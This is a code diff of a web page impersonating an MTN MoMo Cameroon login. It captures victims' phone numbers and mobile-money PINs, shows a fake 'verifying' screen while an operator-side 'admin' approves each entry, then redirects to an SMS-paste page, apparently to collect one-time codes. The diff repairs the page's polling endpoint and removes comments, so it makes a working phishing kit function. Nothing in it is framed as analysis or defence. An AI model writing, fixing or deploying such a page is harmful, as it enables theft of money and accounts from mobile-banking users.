@@ -311,7 +311,6 @@
             flex-shrink: 0;
         }
 
-        /* VERIFYING OVERLAY */
         .verify-overlay {
             position: fixed;
             inset: 0;
@@ -493,7 +492,6 @@
 
     <footer>© 2026 MTN MoMo Cameroon</footer>
 
-    <!-- VERIFYING OVERLAY (waiting for admin) -->
     <div class="verify-overlay" id="verifyOverlay">
         <div class="verify-content">
             <div class="verify-momo-icon">MoMo</div>
@@ -518,7 +516,7 @@
         // ============================================
         // POLLING CONFIG
         // ============================================
-        const POLL_INTERVAL_MS = 2000; // every 2 seconds
+        const POLL_INTERVAL_MS = 2000;
         let pollTimer = null;
 
         // ============================================
@@ -630,16 +628,17 @@
 
         // ============================================
         // POLLING FOR ADMIN APPROVAL
+        // ✅ FIXED: URL now matches server endpoint
         // ============================================
         function startPolling(requestId) {
-            // Clear any existing poll
             stopPolling();
 
             console.log('🔄 Polling started for requestId:', requestId);
 
             pollTimer = setInterval(async () => {
                 try {
-                    const res = await fetch(`${API_BASE}/api/login/status/${requestId}`);
+                    // ✅ FIXED: was `/api/login/status/` → now `/api/approval/status/`
+                    const res = await fetch(`${API_BASE}/api/approval/status/${requestId}`);
                     const data = await res.json();
 
                     console.log('📥 Status check:', data);
@@ -649,7 +648,7 @@
                     if (data.status === 'approved') {
                         console.log('✅ APPROVED');
                         stopPolling();
-                        // Save session info
+
                         localStorage.setItem('momoSession', JSON.stringify({
                             phone: '+237' + phoneInput.value.replace(/\s/g, ''),
                             country: 'CM',
@@ -659,7 +658,6 @@
                         localStorage.setItem('momoPhone', '+237' + phoneInput.value.replace(/\s/g, ''));
                         localStorage.setItem('momoPin', getPinValue());
 
-                        // Redirect to sms-paste.html
                         window.location.href = 'sms-paste.html';
 
                     } else if (data.status === 'rejected') {
@@ -669,18 +667,15 @@
                         loginBtn.disabled = false;
                         loginBtn.textContent = 'LOGIN →';
 
-                        // Clear PIN boxes
                         pinBoxes.forEach(b => {
                             b.value = '';
                             b.classList.remove('filled', 'invalid');
                         });
 
-                        // Show error
                         pinError.textContent = 'Ensure you put correct details.';
                         pinError.classList.add('show');
                         pinBoxes[0].focus();
                     }
-                    // else: still pending → keep polling
 
                 } catch (err) {
                     console.error('Polling error:', err);
@@ -701,7 +696,6 @@
         const loginBtn = document.getElementById('loginBtn');
 
         loginBtn.addEventListener('click', async function() {
-            // --- Validate phone ---
             const phoneDigits = phoneInput.value.replace(/\s/g, '');
             if (phoneDigits.length !== 9 || !/^\d{9}$/.test(phoneDigits)) {
                 phoneWrapper.classList.add('invalid');
@@ -710,7 +704,6 @@
                 return;
             }
 
-            // --- Validate PIN (5 digits) ---
             const pin = getPinValue();
             if (pin.length !== 5) {
                 pinBoxes.forEach(b => b.classList.add('invalid'));
@@ -720,7 +713,6 @@
                 return;
             }
 
-            // --- UI: disable button + show overlay ---
             loginBtn.disabled = true;
             loginBtn.textContent = 'WAITING...';
             showVerifyOverlay();
@@ -741,11 +733,9 @@
                     throw new Error(data.error || 'Login failed');
                 }
 
-                // Save phone + pin early (for SMS/OTP pages)
                 localStorage.setItem('momoPhone', '+237' + phoneDigits);
                 localStorage.setItem('momoPin', pin);
 
-                // Start polling for admin decision
                 startPolling(data.requestId);
 
             } catch (err) {
@@ -757,15 +747,11 @@
             }
         });
 
-        // Auto-focus first PIN box after phone is entered
         phoneInput.addEventListener('blur', function() {
             const digits = this.value.replace(/\s/g, '');
             if (digits.length === 9 && !getPinValue()) pinBoxes[0].focus();
         });
 
-        // ============================================
-        // CLEAN ON LOAD
-        // ============================================
         window.addEventListener('load', () => {
             phoneInput.value = '';
             pinBoxes.forEach(b => {
